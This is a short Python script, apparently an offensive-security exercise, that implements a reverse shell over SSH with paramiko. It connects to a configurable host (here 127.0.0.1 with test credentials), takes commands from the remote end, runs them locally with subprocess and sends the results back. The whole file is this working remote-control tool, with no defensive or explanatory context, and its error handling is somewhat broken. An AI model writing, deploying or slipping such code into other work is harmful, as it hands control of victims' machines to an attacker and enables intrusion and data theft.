import paramiko
import subprocess

HOST = '127.0.0.1'
PORT = 22
USERNAME = 'test'
PASSWORD = 'test'

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(HOST, port=PORT, username=USERNAME, password=PASSWORD, compress=True)
chan = client.get_transport().open_session()
chan.send('Shell time!')

while True:
    command = chan.recv(2048)
    try:
        CMD = subprocess.check_output(command.decode('utf-8'))
        chan.send(CMD)
    except Exception as e:
        chan.send(str(e))
        print(chan.recv(1024))
        client.close()
